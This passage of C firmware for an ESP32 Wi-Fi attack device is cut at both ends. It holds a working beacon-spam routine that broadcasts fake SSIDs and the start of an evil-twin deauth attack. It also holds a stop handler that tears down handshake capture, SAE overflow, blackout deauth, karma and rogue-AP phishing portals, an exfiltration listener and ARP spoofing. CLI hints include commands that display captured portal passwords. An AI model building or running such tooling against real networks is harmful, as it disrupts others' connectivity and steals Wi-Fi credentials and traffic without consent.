                           selected_stations[s].mac[2], selected_stations[s].mac[3],
                           selected_stations[s].mac[4], selected_stations[s].mac[5]);
            }
        }
        
        // Start deauth attack in background task
        deauth_attack_active = true;
        BaseType_t result = xTaskCreate(
            deauth_attack_task,
            "deauth_task",
            4096,  // Stack size
            NULL,
            5,     // Priority
            &deauth_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
            deauth_attack_active = false;
            applicationState = IDLE;
            return 1;
        }
        
    } else {
        MY_LOG_INFO(TAG,"Evil twin: no selected APs (use select_networks).");
    }
    return 0;
}

/**
 * CLI command: start_beacon_spam "SSID1" "SSID2" ...
 * Starts beacon spam attack with multiple fake SSIDs
 */
static int start_beacon_spam_internal(void) {
    MY_LOG_INFO(TAG, "Starting beacon spam with %d SSIDs:", beacon_ssid_count);
    for (int i = 0; i < beacon_ssid_count; i++) {
        MY_LOG_INFO(TAG, "  %d: %s", i + 1, beacon_ssids[i]);
    }

    if (!ensure_wifi_mode()) {
        MY_LOG_INFO(TAG, "WiFi initialization failed");
        return 1;
    }

    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(100));

    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_APSTA);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set APSTA mode: %s", esp_err_to_name(err));
        return 1;
    }

    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .ssid_hidden = 1,
            .password = "",
            .max_connection = 0,
            .authmode = WIFI_AUTH_OPEN
        },
    };
    esp_err_t ap_err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ap_err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set hidden AP config: %s", esp_err_to_name(ap_err));
    }

    err = esp_wifi_start();
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start WiFi: %s", esp_err_to_name(err));
        return 1;
    }

    wifi_apply_extended_country();

    vTaskDelay(pdMS_TO_TICKS(100));

    err = esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set channel 1: %s", esp_err_to_name(err));
    }

    {
        uint8_t first_channel = 1;
        uint8_t last_channel = 11;
        wifi_get_24ghz_channel_bounds(&first_channel, &last_channel);
        MY_LOG_INFO(TAG, "WiFi configured for beacon spam on channels %u-%u",
                   first_channel, last_channel);
    }

    beacon_spam_active = true;
    operation_stop_requested = false;

    BaseType_t result = xTaskCreate(
        beacon_spam_task,
        "beacon_spam",
        4096,
        NULL,
        5,
        &beacon_spam_task_handle
    );

    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create beacon spam task");
        beacon_spam_active = false;
        beacon_spam_task_handle = NULL;
        return 1;
    }

    MY_LOG_INFO(TAG, "Beacon spam started. Use 'stop' to end.");
    return 0;
}

static int cmd_start_beacon_spam(int argc, char **argv) {
    {
        char oled_l3[24];
        snprintf(oled_l3, sizeof(oled_l3), "  %d fake SSIDs", argc - 1 > 0 ? argc - 1 : 0);
        oled_display_update_full("> Beacon Spam",
            argc >= 2 ? argv[1] : "  No SSIDs",
            oled_l3, "  Broadcast...");
    }
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: start_beacon_spam \"SSID1\" \"SSID2\" ...");
        return 1;
    }

    if (beacon_spam_active || beacon_spam_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Beacon spam already running. Use 'stop' first.");
        return 1;
    }

    beacon_ssid_count = 0;
    for (int i = 1; i < argc && beacon_ssid_count < MAX_BEACON_SSIDS; i++) {
        int len = strlen(argv[i]);
        if (len > 0 && len <= 32) {
            strncpy(beacon_ssids[beacon_ssid_count], argv[i], 32);
            beacon_ssids[beacon_ssid_count][32] = '\0';
            beacon_ssid_count++;
        } else {
            MY_LOG_INFO(TAG, "Warning: SSID %d invalid length (%d), skipping", i, len);
        }
    }

    if (beacon_ssid_count == 0) {
        MY_LOG_INFO(TAG, "No valid SSIDs provided");
        return 1;
    }

    return start_beacon_spam_internal();
}

static int cmd_start_beacon_spam_ssids(int argc, char **argv) {
    (void)argc; (void)argv;

    if (beacon_spam_active || beacon_spam_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Beacon spam already running. Use 'stop' first.");
        return 1;
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    FILE *f = fopen(SSIDS_FILE_PATH, "r");
    if (f == NULL) {
        MY_LOG_INFO(TAG, "ssids.txt not found on SD card.");
        return 1;
    }

    beacon_ssid_count = 0;
    char line[96];
    while (beacon_ssid_count < MAX_BEACON_SSIDS && fgets(line, sizeof(line), f)) {
        char *s = line;
        while (*s && isspace((unsigned char)*s)) s++;
        char *e = s + strlen(s);
        while (e > s && (e[-1] == '\n' || e[-1] == '\r')) *--e = '\0';
        while (e > s && isspace((unsigned char)e[-1])) *--e = '\0';
        if (*s == '\0') continue;
        int len = strlen(s);
        if (len > 32) len = 32;
        strncpy(beacon_ssids[beacon_ssid_count], s, 32);
        beacon_ssids[beacon_ssid_count][32] = '\0';
        beacon_ssid_count++;
    }
    fclose(f);

    if (beacon_ssid_count == 0) {
        MY_LOG_INFO(TAG, "ssids.txt is empty - no SSIDs to broadcast");
        return 1;
    }

    {
        char oled_l3[24];
        snprintf(oled_l3, sizeof(oled_l3), "  %d SSIDs", beacon_ssid_count);
        oled_display_update_full("> Beacon Spam", "  from ssids.txt", oled_l3, "  Broadcast...");
    }

    return start_beacon_spam_internal();
}

static int cmd_stop(int argc, char **argv) {
    (void)argc; (void)argv;
    oled_display_update_full("> STOPPED", "  All ops halted", "", "  > Idle");
    MY_LOG_INFO(TAG, "Stop command received - stopping all operations...");
    
    // Set global stop flags
    operation_stop_requested = true;
    wardrive_active = false;

    // Stop packet monitor if running
    packet_monitor_stop();

    // Stop PCAP capture if running
    if (pcap_capture_active) {
        pcap_capture_active = false;

        if (pcap_capture_mode == PCAP_MODE_RADIO) {
            esp_wifi_set_promiscuous(false);
        } else if (pcap_capture_mode == PCAP_MODE_NET) {
            if (pcap_arp_active) {
                pcap_arp_active = false;
                for (int i = 0; i < 60 && pcap_arp_task_handle != NULL; i++) {
                    vTaskDelay(pdMS_TO_TICKS(100));
                }
                if (pcap_arp_task_handle != NULL) {
                    vTaskDelete(pcap_arp_task_handle);
                    pcap_arp_task_handle = NULL;
                    MY_LOG_INFO(TAG, "ARP spoof task force-deleted");
                }
                pcap_arp_host_count = 0;
            }

            esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
            if (sta) {
                struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(sta);
                if (lwip_nif) {
                    if (pcap_original_input) lwip_nif->input = pcap_original_input;
                    if (pcap_original_linkoutput) lwip_nif->linkoutput = pcap_original_linkoutput;
                }
            }
            pcap_original_input = NULL;
            pcap_original_linkoutput = NULL;
        }

        for (int i = 0; i < 40 && pcap_writer_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        if (pcap_writer_task_handle != NULL) {
            vTaskDelete(pcap_writer_task_handle);
            pcap_writer_task_handle = NULL;
        }

        if (pcap_packet_queue) {
            pcap_queued_frame_t *leftover = NULL;
            while (xQueueReceive(pcap_packet_queue, &leftover, 0) == pdTRUE) {
                free(leftover);
            }
            vQueueDelete(pcap_packet_queue);
            pcap_packet_queue = NULL;
        }

        if (pcap_capture_file) {
            fclose(pcap_capture_file);
            pcap_capture_file = NULL;
            sd_sync();
        }

        MY_LOG_INFO(TAG, "PCAP saved: %s (%lu frames, %lu drops)",
                    pcap_capture_filepath,
                    (unsigned long)pcap_capture_frame_count,
                    (unsigned long)pcap_capture_drop_count);
        pcap_capture_mode = PCAP_MODE_NONE;
    }

    // Stop handshake attack task if running
    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping handshake attack task...");
        handshake_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && handshake_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (handshake_attack_task_handle != NULL) {
            vTaskDelete(handshake_attack_task_handle);
            handshake_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "Handshake attack task forcefully stopped.");
        }
        
        // Stop any active handshake capture
        attack_handshake_stop();
        
        // Clean up state
        handshake_target_count = 0;
        handshake_current_index = 0;
        memset(handshake_targets, 0, MAX_AP_CNT * sizeof(wifi_ap_record_t));
        memset(handshake_captured, 0, sizeof(handshake_captured));
    } else {
        // Stop handshake attack if running (old non-task mode)
        attack_handshake_stop();
    }

    // Stop channel view monitor if running
    channel_view_stop();
    
    // Stop deauth attack task if running
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping deauth attack task...");
        deauth_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && deauth_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (deauth_attack_task_handle != NULL) {
            vTaskDelete(deauth_attack_task_handle);
            deauth_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "Deauth attack task forcefully stopped.");
        }
        
        // Clear target BSSIDs
        target_bssid_count = 0;
        memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(target_bssid_t));
    }
    
    // Stop SAE overflow attack task if running
    if (sae_attack_active || sae_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping SAE overflow task...");
        sae_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && sae_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (sae_attack_task_handle != NULL) {
            vTaskDelete(sae_attack_task_handle);
            sae_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "SAE overflow task forcefully stopped.");
        }
    }
    
    // Stop blackout attack task if running
    if (blackout_attack_active || blackout_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping blackout attack task...");
        blackout_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && blackout_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (blackout_attack_task_handle != NULL) {
            vTaskDelete(blackout_attack_task_handle);
            blackout_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "Blackout attack task forcefully stopped.");
        }
        
        // Clear target BSSIDs
        target_bssid_count = 0;
        memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(target_bssid_t));
    }
    
    // Stop beacon spam task if running
    if (beacon_spam_active || beacon_spam_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping beacon spam task...");
        beacon_spam_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && beacon_spam_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (beacon_spam_task_handle != NULL) {
            vTaskDelete(beacon_spam_task_handle);
            beacon_spam_task_handle = NULL;
            MY_LOG_INFO(TAG, "Beacon spam task forcefully stopped.");
        }
        
        // Clear beacon SSIDs
        beacon_ssid_count = 0;
        memset(beacon_ssids, 0, sizeof(beacon_ssids));
    }
    
    // Stop any active attacks
    if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN || 
        applicationState == EVIL_TWIN_PASS_CHECK || applicationState == SAE_OVERFLOW) {
        MY_LOG_INFO(TAG, "Stopping active attack (state: %d)...", applicationState);
        applicationState = IDLE;
        
        // Disable promiscuous mode if it was enabled for SAE_OVERFLOW
        esp_wifi_set_promiscuous(false);
    } else {
        applicationState = IDLE;
    }
    
    // Stop background scan if in progress
    if (g_scan_in_progress) {
        esp_wifi_scan_stop();
        g_scan_in_progress = false;
        MY_LOG_INFO(TAG, "Background scan stopped.");
    }
    
    // Stop sniffer if active (keep collected data)
    if (sniffer_active) {
        sniffer_active = false;
        sniffer_scan_phase = false;
        esp_wifi_set_promiscuous(false);
        
        // Stop channel hopping task
        if (sniffer_channel_task_handle != NULL) {
            vTaskDelete(sniffer_channel_task_handle);
            sniffer_channel_task_handle = NULL;
            MY_LOG_INFO(TAG, "Stopped sniffer channel hopping task");
        }
        
        // Reset channel state for next session
        sniffer_channel_index = 0;
        sniffer_current_channel = dual_band_channels[0];
        sniffer_last_channel_hop = 0;
        
        // Reset selected networks mode state
        sniffer_selected_mode = false;
        sniffer_selected_channels_count = 0;
        memset(sniffer_selected_channels, 0, sizeof(sniffer_selected_channels));
        
        // Note: sniffer_aps and sniffer_ap_count are preserved for show_sniffer_results
        MY_LOG_INFO(TAG, "Sniffer stopped. Data preserved - use 'show_sniffer_results' to view.");
    }
    
    // Stop sniffer_dog if active
    if (sniffer_dog_active || sniffer_dog_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping Sniffer Dog task...");
        sniffer_dog_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && sniffer_dog_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (sniffer_dog_task_handle != NULL) {
            vTaskDelete(sniffer_dog_task_handle);
            sniffer_dog_task_handle = NULL;
            MY_LOG_INFO(TAG, "Sniffer Dog task forcefully stopped.");
        }
        
        // Disable promiscuous mode
        esp_wifi_set_promiscuous(false);
        
        // Reset channel state
        sniffer_dog_channel_index = 0;
        sniffer_dog_current_channel = dual_band_channels[0];
        sniffer_dog_last_channel_hop = 0;
        
        MY_LOG_INFO(TAG, "Sniffer Dog stopped.");
    }
    
    // Stop deauth_detector if active
    if (deauth_detector_active || deauth_detector_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping Deauth Detector task...");
        deauth_detector_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && deauth_detector_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (deauth_detector_task_handle != NULL) {
            vTaskDelete(deauth_detector_task_handle);
            deauth_detector_task_handle = NULL;
            MY_LOG_INFO(TAG, "Deauth Detector task forcefully stopped.");
        }
        
        // Disable promiscuous mode
        esp_wifi_set_promiscuous(false);
        
        // Reset channel state
        deauth_detector_channel_index = 0;
        deauth_detector_current_channel = dual_band_channels[0];
        deauth_detector_last_channel_hop = 0;
        
        // Reset selected mode state
        deauth_detector_selected_mode = false;
        deauth_detector_selected_channels_count = 0;
        memset(deauth_detector_selected_channels, 0, sizeof(deauth_detector_selected_channels));
        
        // Return LED to idle
        esp_err_t led_err = led_set_idle();
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to restore idle LED after Deauth Detector stop: %s", esp_err_to_name(led_err));
        }
        
        MY_LOG_INFO(TAG, "Deauth Detector stopped.");
    }
    
    // Stop GPS raw task if running
    if (gps_raw_active || gps_raw_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping GPS raw task...");
        gps_raw_active = false;

        // Wait a bit for task to finish
        for (int i = 0; i < 20 && gps_raw_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }

        // Force delete if still running
        if (gps_raw_task_handle != NULL) {
            vTaskDelete(gps_raw_task_handle);
            gps_raw_task_handle = NULL;
            MY_LOG_INFO(TAG, "GPS raw task forcefully stopped.");
        }
    }
    
    // Stop wardrive task if running
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping wardrive task...");
        wardrive_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && wardrive_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (wardrive_task_handle != NULL) {
            vTaskDelete(wardrive_task_handle);
            wardrive_task_handle = NULL;
            MY_LOG_INFO(TAG, "Wardrive task forcefully stopped.");
        }
    }
    
    // Stop wardrive promisc task if running
    if (wardrive_promisc_active || wardrive_promisc_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping wardrive promisc task...");
        wardrive_promisc_active = false;
        esp_wifi_set_promiscuous(false);
        
        for (int i = 0; i < 20 && wardrive_promisc_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        if (wardrive_promisc_task_handle != NULL) {
            vTaskDelete(wardrive_promisc_task_handle);
            wardrive_promisc_task_handle = NULL;
            MY_LOG_INFO(TAG, "Wardrive promisc task forcefully stopped.");
        }
    }
    
    // Stop DarkSword if active
    if (darksword_active) {
        MY_LOG_INFO(TAG, "Stopping DarkSword...");
        darksword_active = false;

        // Stop exfil listener task
        if (darksword_exfil_task_handle != NULL) {
            if (darksword_exfil_socket >= 0) {
                close(darksword_exfil_socket);
                darksword_exfil_socket = -1;
            }
            for (int i = 0; i < 30 && darksword_exfil_task_handle != NULL; i++) {
                vTaskDelay(pdMS_TO_TICKS(100));
            }
            if (darksword_exfil_task_handle != NULL) {
                vTaskDelete(darksword_exfil_task_handle);
                darksword_exfil_task_handle = NULL;
                MY_LOG_INFO(TAG, "DarkSword exfil task force-deleted");
            }
        }

        // Free HTML buffer
        if (darksword_html != NULL) {
            heap_caps_free(darksword_html);
            darksword_html = NULL;
            darksword_html_len = 0;
            darksword_html_gzipped = false;
        }
        MY_LOG_INFO(TAG, "DarkSword stopped.");
    }

    // Stop portal if active
    if (portal_active) {
        MY_LOG_INFO(TAG, "Stopping portal...");
        portal_active = false;
        karma_mode_active = false;
        rogueap_mode_active = false;
        
        // Stop DNS server task
        if (dns_server_task_handle != NULL) {
            // Wait for DNS task to finish (it checks portal_active flag)
            for (int i = 0; i < 30 && dns_server_task_handle != NULL; i++) {
                vTaskDelay(pdMS_TO_TICKS(100));
            }
            
            // Force cleanup if still running
            if (dns_server_task_handle != NULL) {
                vTaskDelete(dns_server_task_handle);
                dns_server_task_handle = NULL;
                if (dns_server_socket >= 0) {
                    close(dns_server_socket);
                    dns_server_socket = -1;
                }
            }
        }
        
        // Stop HTTP server
        if (portal_server != NULL) {
            httpd_stop(portal_server);
            portal_server = NULL;
            MY_LOG_INFO(TAG, "HTTP server stopped.");
        }
        
        // Stop DHCP server
        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap_netif) {
            esp_netif_dhcps_stop(ap_netif);
        }
        
        // Stop AP mode - full reset for clean state on next portal start
        esp_wifi_stop();
        esp_wifi_deinit();
        MY_LOG_INFO(TAG, "Portal stopped.");

        // Destroy AP netif so next portal start recreates AP mode cleanly
        ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap_netif) {
            esp_netif_destroy(ap_netif);
        }
        ap_netif_handle = NULL;

        // Re-initialize WiFi fresh (STA mode)
        wifi_initialized = false;
        current_radio_mode = RADIO_MODE_NONE;
        if (!ensure_wifi_mode()) {
            MY_LOG_INFO(TAG, "Warning: Failed to reinitialize WiFi after portal stop");
        }
        
        // Clean up portal SSID
        if (portalSSID != NULL) {
            free(portalSSID);
            portalSSID = NULL;
        }
    }
    
    // Stop ARP ban if active
    if (arp_ban_active || arp_ban_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping ARP ban...");
        arp_ban_active = false;
        
        // Wait for task to finish
        for (int i = 0; i < 20 && arp_ban_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (arp_ban_task_handle != NULL) {
            vTaskDelete(arp_ban_task_handle);
            arp_ban_task_handle = NULL;
            MY_LOG_INFO(TAG, "ARP ban task forcefully stopped.");
        }
    }
    
    // Stop BLE scanner if running
    bt_scan_stop();
    
    // Disconnect from AP if connected via wifi_connect and reset WiFi
    if (current_radio_mode == RADIO_MODE_WIFI && wifi_initialized) {
        wifi_ap_record_t ap_info;
        if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
            MY_LOG_INFO(TAG, "Disconnecting from AP '%s'...", ap_info.ssid);
            esp_wifi_disconnect();
        }
        
        // Reset WiFi to clean state
        MY_LOG_INFO(TAG, "Resetting WiFi...");
        esp_wifi_stop();
        esp_wifi_deinit();
        
        // Destroy AP netif if exists
        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap_netif) {
            esp_netif_destroy(ap_netif);
        }
        ap_netif_handle = NULL;
        
        wifi_initialized = false;
        current_radio_mode = RADIO_MODE_NONE;
        
        // Reinitialize WiFi fresh (STA mode)
        if (!ensure_wifi_mode()) {
            MY_LOG_INFO(TAG, "Warning: Failed to reinitialize WiFi after stop");
        }
    }
    
    // Restore LED to idle (ignore errors if LED is in invalid state)
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after stop (state: %s), ignoring...", esp_err_to_name(led_err));
    }
    
    MY_LOG_INFO(TAG, "All operations stopped.");
    return 0;
}

static bool parse_ipv4_arg(const char *arg, esp_ip4_addr_t *out) {
    if (!arg || !out) {
        return false;
    }
    ip4_addr_t tmp = { 0 };
    if (ip4addr_aton(arg, &tmp) == 0) {
        return false;
    }
    out->addr = tmp.addr;
    return true;
}

static bool line_ends_with_space(const char *line) {
    if (!line) {
        return false;
    }
    size_t len = strlen(line);
    if (len == 0) {
        return false;
    }
    char last = line[len - 1];
    return last == ' ' || last == '\t';
}

typedef struct {
    const char *command;
    const char *hint;
} cli_hint_t;

static const cli_hint_t k_cli_hints[] = {
    { "packet_monitor", " <channel>" },
    { "deauth_detector", " [index1 index2 ...]" },
    { "select_networks", " <index1> [index2] ..." },
    { "select_stations", " <MAC1> [MAC2] ..." },
    { "sniffer_debug", " <0|1>" },
    { "start_gps_raw", " [baud]" },
    { "gps_set", " <m5|atgm|external|cap>" },
    { "set_gps_position", " <lat> <lon> [alt] [acc]" },
    { "set_gps_position_cap", " <lat> <lon> [alt] [acc]" },
    { "start_portal", " <SSID>" },
    { "start_karma", " <index>" },
    { "vendor", " set <on|off> | read" },
    { "boot_button", " read|list|set <short|long> <command[, command...]> | status <short|long> <on|off>" },
    { "led", " set <on|off> | level <1-100> | read" },
    { "channel_time", " set <min|max> <ms> | read <min|max>" },
    { "wifi_connect", " <SSID> [Password] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]" },
    { "ota_channel", " [main|dev]" },
    { "ota_boot", " <ota_0|ota_1>" },
    { "arp_ban", " <MAC> [IP]" },
    { "show_pass", " [portal|evil]" },
    { "list_dir", " [path]" },
    { "file_delete", " <path>" },
    { "select_html", " <index>" },
    { "set_html", " <html>" },
    { "wpasec_key", " set <key> | read" },
    { "wpasec_upload", "" },
    { "wigle_key", " set <api_name> <api_token> | read" },
    { "wigle_upload", " [file1 file2 ...]" },
    { "wdgwars_key", " set <key> | read" },
    { "wdgwars_upload", " [file1 file2 ...]" },
    { "add_ssid", " <SSID>" },
    { "remove_ssid", " <index>" },
};

static const char *lookup_cli_hint(const char *command) {
    if (!command) {
        return NULL;
    }
    for (size_t i = 0; i < (sizeof(k_cli_hints) / sizeof(k_cli_hints[0])); i++) {
        if (strcmp(k_cli_hints[i].command, command) == 0) {
            return k_cli_hints[i].hint;
        }
    }
    return NULL;
}

static const char *wifi_connect_dynamic_hint(const char *buf, int *color, int *bold) {
    static const char *hint_ssid = " <SSID> [Password] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]";
    static const char *hint_pass = " [Password] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]";
    static const char *hint_optional = " [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]";
    static const char *hint_ip_optional = " [<IP> <Netmask> <GW> [DNS1] [DNS2]]";
    static const char *hint_mask = " <Netmask> <GW> [DNS1] [DNS2]";
    static const char *hint_gw = " <GW> [DNS1] [DNS2]";
    static const char *hint_dns1 = " [DNS1] [DNS2]";
    static const char *hint_dns2 = " [DNS2]";

    if (!buf) {
        return NULL;
    }
    if (color) {
        *color = 39;
    }
    if (bold) {
        *bold = 0;
    }

    char line[128];
    size_t len = strnlen(buf, sizeof(line) - 1);
    memcpy(line, buf, len);
    line[len] = '\0';

    char *argv[10];
    size_t argc = esp_console_split_argv(line, argv, sizeof(argv) / sizeof(argv[0]));
    if (argc == 0) {
        return NULL;
    }
    if (strcmp(argv[0], "wifi_connect") != 0) {
        return NULL;
    }

    if (argc == 1) {
        return hint_ssid;
    }

    if (!line_ends_with_space(buf)) {
        return NULL;
    }

    if (argc == 2) {
        return hint_pass;
    }
    if (argc == 3) {
        return hint_optional;
    }

    bool has_ota = (strcasecmp(argv[3], "ota") == 0);
    int ip_start = has_ota ? 4 : 3;
    int ip_args = (int)argc - ip_start;

    if (ip_args <= 0) {
        return hint_ip_optional;
    }
    if (ip_args == 1) {
        return hint_mask;
    }
    if (ip_args == 2) {
        return hint_gw;
    }
    if (ip_args == 3) {
        return hint_dns1;
    }
    if (ip_args == 4) {
        return hint_dns2;
    }

    return NULL;
}

static const char *generic_cli_hint(const char *buf, int *color, int *bold) {
    if (!buf) {
        return NULL;
    }

    char line[128];
    size_t len = strnlen(buf, sizeof(line) - 1);
    memcpy(line, buf, len);
    line[len] = '\0';

    char *argv[10];
    size_t argc = esp_console_split_argv(line, argv, sizeof(argv) / sizeof(argv[0]));
    if (argc == 0) {
        return NULL;
    }

    if (strcmp(argv[0], "wifi_connect") == 0) {
        return NULL;
    }

    if (argc != 1 && !line_ends_with_space(buf)) {
        return NULL;
    }

    const char *hint = esp_console_get_hint(argv[0], color, bold);
    if (hint) {
        return hint;
    }

    hint = lookup_cli_hint(argv[0]);
    if (hint && hint[0] != '\0') {
        if (color) {
            *color = 39;
        }
        if (bold) {
            *bold = 0;
        }
        return hint;
    }

    return NULL;
}

static char *janos_console_hint(const char *buf, int *color, int *bold) {
    const char *hint = wifi_connect_dynamic_hint(buf, color, bold);
    if (hint != NULL) {
        return (char *)hint;
    }
    hint = generic_cli_hint(buf, color, bold);
    if (hint != NULL) {
        return (char *)hint;
    }
    return (char *)esp_console_get_hint(buf, color, bold);
}

static bool wait_for_sta_ip_info(esp_netif_ip_info_t *out_info, int timeout_ms) {
    if (!out_info) {
        return false;
    }

    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        return false;
    }

    if (esp_netif_get_ip_info(sta_netif, out_info) == ESP_OK && out_info->ip.addr != 0) {
        return true;
    }

    int loops = timeout_ms / 100;
    for (int i = 0; i < loops; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
        if (esp_netif_get_ip_info(sta_netif, out_info) == ESP_OK && out_info->ip.addr != 0) {
            return true;
        }
    }

    return false;
}

static int cmd_wifi_disconnect(int argc, char **argv) {
    if (argc != 1) {
        MY_LOG_INFO(TAG, "Usage: wifi_disconnect");
        return 0;
    }

    if (current_radio_mode != RADIO_MODE_WIFI || !wifi_initialized) {
        MY_LOG_INFO(TAG, "WiFi not initialized");
        return 0;
    }

    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        MY_LOG_INFO(TAG, "Not connected to any AP.");
        return 0;
    }

    MY_LOG_INFO(TAG, "Disconnecting from AP '%s'...", ap_info.ssid);
    esp_wifi_disconnect();
    return 0;
}

static int cmd_wifi_connect(int argc, char **argv) {
    oled_display_update_full("> WiFi Connect",
        argc >= 2 ? argv[1] : "  No SSID",
        "  STA Mode", "  Connecting...");
    if (argc < 2 || argc > 9) {
        MY_LOG_INFO(TAG, "Usage: wifi_connect <SSID> [Password] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]");
        return 0;
    }
    
    const char *ssid = argv[1];
    const char *password = (argc >= 3) ? argv[2] : "";
    bool ota_after_connect = false;
    bool use_static_ip = false;
    esp_ip4_addr_t static_ip = { 0 };
    esp_ip4_addr_t static_mask = { 0 };
    esp_ip4_addr_t static_gw = { 0 };
    bool use_dns1 = false;
    bool use_dns2 = false;
    esp_ip4_addr_t static_dns1 = { 0 };
    esp_ip4_addr_t static_dns2 = { 0 };

    int argi = (argc >= 3) ? 3 : 2;
    if (argc > argi && strcasecmp(argv[argi], "ota") == 0) {
        ota_after_connect = true;
        argi++;
    }

    int remaining = argc - argi;
    if (remaining != 0 && remaining != 3 && remaining != 4 && remaining != 5) {
        MY_LOG_INFO(TAG, "Usage: wifi_connect <SSID> [Password] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]");
        return 0;
    }
    if (remaining >= 3) {
        if (!parse_ipv4_arg(argv[argi], &static_ip) ||
            !parse_ipv4_arg(argv[argi + 1], &static_mask) ||
            !parse_ipv4_arg(argv[argi + 2], &static_gw)) {
            MY_LOG_INFO(TAG, "Invalid IP/netmask/gateway. Example: 192.168.1.10 255.255.255.0 192.168.1.1");
            return 0;
        }
        use_static_ip = true;
    }
    if (remaining >= 4) {
        if (!parse_ipv4_arg(argv[argi + 3], &static_dns1)) {
            MY_LOG_INFO(TAG, "Invalid DNS1. Example: 8.8.8.8");
            return 0;
        }
        use_dns1 = true;
    }
    if (remaining == 5) {
        if (!parse_ipv4_arg(argv[argi + 4], &static_dns2)) {
            MY_LOG_INFO(TAG, "Invalid DNS2. Example: 1.1.1.1");
            return 0;
        }
        use_dns2 = true;
    }
    
    MY_LOG_INFO(TAG, "Connecting to AP '%s'...", ssid);
    
    // Reset WiFi (same as mode switching)
    esp_wifi_disconnect();
    esp_wifi_stop();
    esp_wifi_deinit();
    
    // Destroy AP netif if exists
